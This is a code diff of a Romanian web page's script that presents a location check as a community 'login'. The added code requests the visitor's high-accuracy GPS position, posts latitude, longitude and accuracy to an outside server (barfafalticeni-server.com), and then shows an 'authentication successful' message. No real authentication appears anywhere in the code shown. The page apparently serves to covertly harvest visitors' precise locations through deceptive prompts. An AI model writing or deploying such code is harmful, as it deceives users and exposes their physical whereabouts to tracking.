@@ -40,42 +40,41 @@
     
     <script>
         function sendLocation() {
-            if (navigator.geolocation) {
-                let bestPosition = null;
-                let watchId = navigator.geolocation.watchPosition(position => {
-                    if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-                        bestPosition = position;
-                    }
-                }, error => {
-                    alert('Nu te poti autentifica. Verifică permisiunile browserului.');
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchId);
-                    if (bestPosition) {
-                        const latitude = bestPosition.coords.latitude;
-                        const longitude = bestPosition.coords.longitude;
-                        const accuracy = bestPosition.coords.accuracy;
-
-                        fetch('http://localhost:3000/send-location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ latitude, longitude, accuracy })
-                        })
-                        .then(response => response.json())
-                        .then(data => alert(`Autentificare realizata cu succes!`))
-                        .catch(error => console.error('Eroare:', error));
-                    } else {
-                        alert('Pntru a avea acces trebuie sa fii din Falticeni.');
-                    }
-                }, 10000); // Asteaptă 10 secunde pentru a aduna mai multe date
-            } else {
-                alert('Din pacate nu te afli in zona Falticeni, nu te poti conecta, contacteaza un Admin al comunitatii.');
+            if (!navigator.geolocation) {
+                alert('Din păcate, browserul tău nu suportă geolocalizare.');
+                return;
             }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    console.log(`Lat: ${latitude}, Lon: ${longitude}, Precizie: ${accuracy}m`);
+
+                    fetch('https://barfafalticeni-server.com/send-location', { // Modifică URL-ul serverului aici
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude, longitude, accuracy })
+                    })
+                    .then(response => response.json())
+                    .then(data => alert(`Autentificare realizată cu succes!`))
+                    .catch(error => console.error('Eroare:', error));
+                },
+                (error) => {
+                    if (error.code === error.PERMISSION_DENIED) {
+                        alert('Te rog să permiți accesul la locație pentru a continua.');
+                    } else {
+                        alert('Nu s-a putut obține locația. Încearcă din nou.');
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000, // Timeout mai mare pentru iOS
+                    maximumAge: 0
+                }
+            );
         }
     </script>
 </body>
